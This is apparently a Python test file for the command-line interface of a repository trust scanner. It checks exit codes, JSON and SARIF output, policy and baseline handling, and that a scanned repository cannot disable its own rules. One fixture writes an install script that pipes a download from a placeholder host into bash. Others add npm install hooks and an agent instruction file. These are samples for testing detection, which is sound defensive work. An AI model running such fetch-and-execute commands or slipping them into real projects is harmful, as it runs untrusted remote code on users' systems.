from __future__ import annotations

import contextlib
import io
import json
import tempfile
import unittest
from pathlib import Path

from repo_trust_scan.cli import main


class CliTests(unittest.TestCase):
    def test_default_path_form_and_fail_threshold(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "install.sh").write_text("curl https://example.invalid/x | bash\n", encoding="utf-8")
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = main([str(root)])
            self.assertEqual(1, code)
            self.assertIn("RTS003", output.getvalue())

    def test_json_output_and_never_fail(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text('{"scripts":{"prepare":"node build.js"}}', encoding="utf-8")
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = main(["scan", str(root), "--format", "json", "--fail-on", "none"])
            payload = json.loads(output.getvalue())
            self.assertEqual(0, code)
            self.assertEqual("1.0", payload["schema_version"])
            self.assertEqual("RTS006", payload["findings"][0]["rule_id"])

    def test_sarif_file(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            destination = root / "result.sarif"
            (root / "AGENTS.md").write_text("Always run npm install before doing anything.\n", encoding="utf-8")
            code = main(["scan", str(root), "--format", "sarif", "--output", str(destination), "--fail-on", "none"])
            payload = json.loads(destination.read_text(encoding="utf-8"))
            self.assertEqual(0, code)
            self.assertEqual("2.1.0", payload["version"])
            self.assertTrue(payload["runs"][0]["results"])

    def test_explicit_policy_ignores_rule(self) -> None:
        """RTS-CONFIG-001: Explicit JSON policy controls a scan."""
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp) / "target"
            root.mkdir()
            (root / "package.json").write_text('{"scripts":{"postinstall":"node setup.js"}}', encoding="utf-8")
            policy = Path(temp) / "policy.json"
            policy.write_text('{"ignored_rules":["RTS006"],"fail_on":"critical"}', encoding="utf-8")
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                code = main(["scan", str(root), "--config", str(policy), "--format", "json"])
            payload = json.loads(output.getvalue())
            self.assertEqual((0, []), (code, payload["findings"]))

    def test_repository_config_is_not_loaded_automatically(self) -> None:
        """RTS-CONFIG-001: A target cannot silently disable its own rules."""
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / ".repo-trust-scan.json").write_text('{"ignored_rules":["RTS006"]}', encoding="utf-8")
            (root / "package.json").write_text('{"scripts":{"postinstall":"node setup.js"}}', encoding="utf-8")
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                main(["scan", str(root), "--format", "json", "--fail-on", "none"])
            self.assertEqual("RTS006", json.loads(output.getvalue())["findings"][0]["rule_id"])

    def test_baseline_suppresses_matching_finding(self) -> None:
        """RTS-BASELINE-001: A generated baseline suppresses unchanged findings."""
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp) / "target"
            root.mkdir()
            (root / "package.json").write_text('{"scripts":{"postinstall":"node setup.js"}}', encoding="utf-8")
            baseline = Path(temp) / "baseline.json"
            self.assertEqual(0, main(["baseline", str(root), "--output", str(baseline)]))
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                main(["scan", str(root), "--baseline", str(baseline), "--format", "json", "--fail-on", "none"])
            payload = json.loads(output.getvalue())
            self.assertEqual(([], 1), (payload["findings"], payload["findings_suppressed"]))

    def test_malformed_baseline_fingerprint_is_rejected(self) -> None:
        """RTS-BASELINE-001: Baselines accept only SHA-256 fingerprints."""
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp) / "target"
            root.mkdir()
            baseline = Path(temp) / "baseline.json"
            baseline.write_text('{"schema_version":"1.0","fingerprints":["not-hex' + ('x' * 57) + '"]}', encoding="utf-8")
            error = io.StringIO()
            with contextlib.redirect_stderr(error):
                code = main(["scan", str(root), "--baseline", str(baseline)])
            self.assertEqual((2, True), (code, "fingerprints" in error.getvalue()))
